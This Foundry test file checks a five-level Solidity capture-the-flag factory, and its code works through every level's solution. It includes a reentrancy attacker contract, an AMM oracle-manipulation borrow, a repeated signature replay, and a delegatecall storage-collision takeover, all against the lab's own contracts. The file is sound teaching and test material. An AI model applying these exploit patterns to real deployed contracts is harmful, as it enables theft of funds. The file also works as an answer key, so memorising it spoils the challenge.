// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {CTFFactory} from "../src/CTFFactory.sol";
import {SoulboundBadge} from "../src/SoulboundBadge.sol";
import {Level1_AccessControl} from "../src/Level1_AccessControl.sol";
import {Level2_Reentrancy} from "../src/Level2_Reentrancy.sol";
import {Level3_OracleManipulation} from "../src/Level3_OracleManipulation.sol";
import {Level4_SignatureReplay} from "../src/Level4_SignatureReplay.sol";
import {Level5_ProxyVault, Level5_Implementation} from "../src/Level5_Delegatecall.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

// Re-using the Attacker from Level2
contract Level2Attacker {
    Level2_Reentrancy public vault;

    constructor(Level2_Reentrancy _vault) {
        vault = _vault;
    }

    function attack() external payable {
        vault.donate{value: msg.value}(address(this));
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= msg.value) {
            vault.withdraw();
        }
    }
}

// Re-using the Attacker from Level3
contract Level3Attacker {
    Level3_OracleManipulation public vault;

    constructor(Level3_OracleManipulation _vault) {
        vault = _vault;
    }

    function attack() external payable {
        vault.claimAirdrop();
        uint256 balance = vault.token().balanceOf(address(this));
        vault.amm().swapETHForTokens{value: msg.value}();
        vault.token().approve(address(vault), balance);
        vault.deposit(balance);
        vault.borrow(0.1 ether);
    }
    
    receive() external payable {}
}

contract CTFFactoryTest is Test {
    CTFFactory public factory;
    
    uint256 public level4SignerPrivateKey = 0xabc123;
    address public level4TrustedSigner;
    
    address public player = address(0x1337);

    function setUp() public {
        level4TrustedSigner = vm.addr(level4SignerPrivateKey);
        factory = new CTFFactory(level4TrustedSigner);
        vm.deal(player, 10 ether); // plenty of ETH for deployment and exploitation
    }
    
    function _generateL4Signature(address vault, address _recipient, uint256 _amount) internal view returns (bytes memory) {
        bytes32 messageHash = keccak256(abi.encodePacked(vault, _recipient, _amount));
        bytes32 ethSignedMessageHash = MessageHashUtils.toEthSignedMessageHash(messageHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(level4SignerPrivateKey, ethSignedMessageHash);
        return abi.encodePacked(r, s, v);
    }

    function test_FullIntegrationProgression() public {
        vm.startPrank(player);

        // ----------------------------------------
        // LEVEL 1: ACCESS CONTROL
        // ----------------------------------------
        // Test level skipping
        vm.expectRevert("Must solve Level 1 first");
        factory.deployLevel2{value: 0.01 ether}();

        // Test incorrect ETH
        vm.expectRevert("Must fund the level instance with 0.01 ETH");
        factory.deployLevel1{value: 0.02 ether}();

        // Deploy L1
        Level1_AccessControl l1 = Level1_AccessControl(factory.deployLevel1{value: 0.01 ether}());
        assertEq(factory.levelInstances(1, player), address(l1));

        // Exploit L1
        l1.withdrawAll(payable(player));
        
        // Validate L1
        factory.validateLevel1();
        assertTrue(factory.isSolved(1, player));
        assertEq(factory.badgeContract().balanceOf(player, 1), 1);

        // ----------------------------------------
        // LEVEL 2: REENTRANCY
        // ----------------------------------------
        vm.expectRevert("Must solve Level 2 first");
        factory.deployLevel3{value: 0.11 ether}();

        // Deploy L2
        Level2_Reentrancy l2 = Level2_Reentrancy(factory.deployLevel2{value: 0.01 ether}());
        
        // Exploit L2
        Level2Attacker l2Attacker = new Level2Attacker(l2);
        l2Attacker.attack{value: 0.001 ether}();

        // Validate L2
        factory.validateLevel2();
        assertTrue(factory.isSolved(2, player));
        assertEq(factory.badgeContract().balanceOf(player, 2), 1);

        // ----------------------------------------
        // LEVEL 3: ORACLE MANIPULATION
        // ----------------------------------------
        vm.expectRevert("Must solve Level 3 first");
        factory.deployLevel4{value: 0.05 ether}();

        // Deploy L3
        Level3_OracleManipulation l3 = Level3_OracleManipulation(factory.deployLevel3{value: 0.11 ether}());
        
        // Exploit L3
        Level3Attacker l3Attacker = new Level3Attacker(l3);
        l3Attacker.attack{value: 0.1 ether}();

        // Validate L3
        factory.validateLevel3();
        assertTrue(factory.isSolved(3, player));
        assertEq(factory.badgeContract().balanceOf(player, 3), 1);

        // ----------------------------------------
        // LEVEL 4: SIGNATURE REPLAY
        // ----------------------------------------
        vm.expectRevert("Must solve Level 4 first");
        factory.deployLevel5{value: 0.05 ether}();

        // Deploy L4
        Level4_SignatureReplay l4 = Level4_SignatureReplay(factory.deployLevel4{value: 0.05 ether}());

        // Exploit L4
        bytes memory sig = _generateL4Signature(address(l4), player, 0.01 ether);
        l4.withdraw(player, 0.01 ether, sig);
        l4.withdraw(player, 0.01 ether, sig);
        l4.withdraw(player, 0.01 ether, sig);
        l4.withdraw(player, 0.01 ether, sig);
        l4.withdraw(player, 0.01 ether, sig);

        // Validate L4
        factory.validateLevel4();
        assertTrue(factory.isSolved(4, player));
        assertEq(factory.badgeContract().balanceOf(player, 4), 1);

        // ----------------------------------------
        // LEVEL 5: DELEGATECALL STORAGE COLLISION
        // ----------------------------------------
        // Deploy L5
        Level5_ProxyVault l5 = Level5_ProxyVault(payable(factory.deployLevel5{value: 0.05 ether}()));

        // Exploit L5
        bytes memory data = abi.encodeWithSignature("updateAddress(address)", player);
        l5.execute(data);
        l5.withdraw(payable(player));

        // Validate L5
        factory.validateLevel5();
        assertTrue(factory.isSolved(5, player));
        assertEq(factory.badgeContract().balanceOf(player, 5), 1);

        vm.stopPrank();
    }
}
